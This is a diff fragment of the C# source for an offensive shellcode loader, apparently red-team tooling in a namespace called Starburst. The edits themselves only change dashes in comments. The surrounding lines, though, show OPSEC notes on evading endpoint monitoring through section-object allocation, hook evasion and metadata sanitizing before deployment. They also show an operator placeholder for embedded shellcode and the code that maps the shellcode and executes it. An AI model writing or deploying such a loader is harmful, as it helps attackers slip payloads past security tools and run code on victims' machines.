@@ -5,13 +5,13 @@
 // Usage:   sectionloader.exe [shellcode.bin]
 //          If no argument, uses embedded shellcode byte array.
 // OPSEC Notes:
-//   - Avoids VirtualAlloc entirely — uses section objects for allocation.
+//   - Avoids VirtualAlloc entirely - uses section objects for allocation.
 //   - NtCreateSection + NtMapViewOfSection is a less-monitored allocation
 //     pattern compared to VirtualAlloc.
 //   - Maps section as RW, copies shellcode, then remaps as RX.
 //   - Section-backed memory pages appear different in memory scans than
 //     privately-allocated pages.
-//   - Still uses ntdll exports which may be hooked — consider DInvoke.cs
+//   - Still uses ntdll exports which may be hooked - consider DInvoke.cs
 //     for full hook evasion.
 //   - .NET assembly metadata should be sanitized before deployment.
 //   - The dual-mapping technique (RW write view + RX execute view) provides
@@ -105,7 +105,7 @@ namespace Starburst
 
         // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
         static byte[] embeddedShellcode = new byte[] {
-            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER — replace with real shellcode
+            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
         };
 
         static void Main(string[] args)
@@ -209,13 +209,13 @@ namespace Starburst
                 return;
             }
 
-            // Copy shellcode to the RW view — it is simultaneously visible in the RX view
+            // Copy shellcode to the RW view - it is simultaneously visible in the RX view
             Marshal.Copy(shellcode, 0, rwAddress, shellcode.Length);
 
             // Clear shellcode from managed memory
             Array.Clear(shellcode, 0, shellcode.Length);
 
-            // Unmap the RW view — we no longer need write access
+            // Unmap the RW view - we no longer need write access
             NtUnmapViewOfSection(currentProcess, rwAddress);
 
             // Execute shellcode from the RX view
